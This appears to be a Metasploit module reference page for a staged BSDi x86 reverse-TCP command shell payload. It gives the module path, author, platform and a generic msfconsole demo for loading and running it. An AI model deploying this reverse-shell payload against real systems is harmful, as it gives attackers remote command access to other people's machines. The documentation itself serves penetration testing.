## BSDi Command Shell, Reverse TCP Stager

Spawn a command shell (staged). Connect back to the attacker


## Module Name
payload/bsdi/x86/shell/reverse_tcp

## Authors
* skape





## Platforms
* bsdi

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/bsdi/x86/shell/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    